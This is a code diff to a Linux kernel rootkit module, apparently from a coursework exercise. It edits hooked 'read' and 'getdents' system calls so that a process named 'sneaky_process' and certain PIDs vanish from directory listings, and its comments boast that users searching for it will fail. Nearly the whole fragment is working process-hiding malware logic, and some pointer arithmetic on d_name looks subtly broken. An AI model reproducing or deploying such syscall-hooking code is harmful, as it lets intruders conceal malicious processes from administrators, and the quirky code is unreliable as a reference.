@@ -84,14 +84,12 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
   }
   return fd;
 }
-char *processname = "sneaky_process";
-char *modename = "sneaky_mod";
+
 asmlinkage ssize_t (*original_read)(int fd, char *buf, size_t count);
 // Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
   ssize_t rest;
-  char *start;
-  char *end;
+  char *start, *end;
   rest = original_read(fd, buf, count);
   // it is better to use fd here to prevent the effect of context switch
   // read might not follow with open
@@ -106,32 +104,31 @@ asmlinkage ssize_t sneaky_sys_read(int fd, char *buf, size_t count) {
   }
   return rest;
 }
+// Define our new sneaky version of the 'getdents' syscall
 asmlinkage long (*original_getdents)(unsigned int fd,
                                      struct linux_dirent64 __user *dirp,
                                      unsigned int count);
-
 asmlinkage long sneaky_sys_getdents(unsigned int fd,
                                     struct linux_dirent64 __user *dirp,
                                     unsigned int count) {
-  long total;
-  long rest;
-  int cur_pid;
-  int len;
-  total = original_getdents(fd, dirp, count);
-  rest = total;
-
+  long total, rest;
+  int cur_pid, len;
+  rest = total = original_getdents(fd, dirp, count);
+  // search each dirp
   while (rest > 0) {
     char *name;
     len = dirp->d_reclen;
     cur_pid = atoi(dirp->d_name - 1);
     name = dirp->d_name - 1;
     rest -= len;
-    if (strcmp(name, processname) == 0) {
+    // if user want to find sneaky_process or its correspoding pid
+    // user will fail
+    // our module can hide us
+    if (strcmp(name, "sneaky_process") == 0 || cur_pid == pid ||
+        cur_pid == pid - 1) {
       memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
       total -= len;
-    } else if (cur_pid == pid) {
-      memmove(dirp, (void *)dirp + dirp->d_reclen, rest);
-      total -= len;
+      continue;
     }
     if (rest > 0)
       dirp = (struct linux_dirent64 *)((void *)dirp + dirp->d_reclen);
